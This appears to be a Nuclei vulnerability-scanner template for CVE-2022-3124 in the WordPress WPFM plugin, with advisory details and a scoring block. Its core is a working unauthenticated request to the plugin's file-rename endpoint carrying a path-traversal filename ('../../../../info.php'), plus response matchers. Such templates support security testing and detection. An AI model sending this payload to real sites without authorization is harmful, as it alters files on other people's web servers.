id: CVE-2022-3124

info:
  name: WordPress WPFM Plugin - File Rename
  author: riteshs4hu
  severity: medium
  description: |
    The plugin allows any unauthenticated user to rename uploaded files from users. Furthermore, due to the lack of validation in the destination filename, this could allow allow them to change the content of arbitrary files on the web server.
  reference:
    - https://wpscan.com/vulnerability/00f76765-95af-4dbc-8c37-f1b15a0e8608/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
    cvss-score: 5.3
    cve-id: CVE-2022-3124
    cwe-id: CWE-862
    cpe: cpe:2.3:a:najeebmedia:frontend_file_manager::::::wordpress::*
  metadata:
    verified: true
    max-request: 1
    framework: wordpress
  tags: cve,cve2022,wordpress,wp-plugin,wp,wpscan

variables:
  fileid: "33"
  filename: "../../../../info.php"

requests:
  - method: POST
    path:
      - "{{BaseURL}}/wp-json/wpfm/v1/file-rename"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      fileid={{fileid}}&filename={{filename}}

    matchers-condition: and
    matchers:
      - type: regex
        name: fileid
        part: body
        regex:
          - '"fileid"\s*:\s*"([^"]+)"'

      - type: regex
        name: filename
        part: body
        regex:
          - '"filename"\s*:\s*"([^"]+)"'

      - type: status
        status:
          - 200
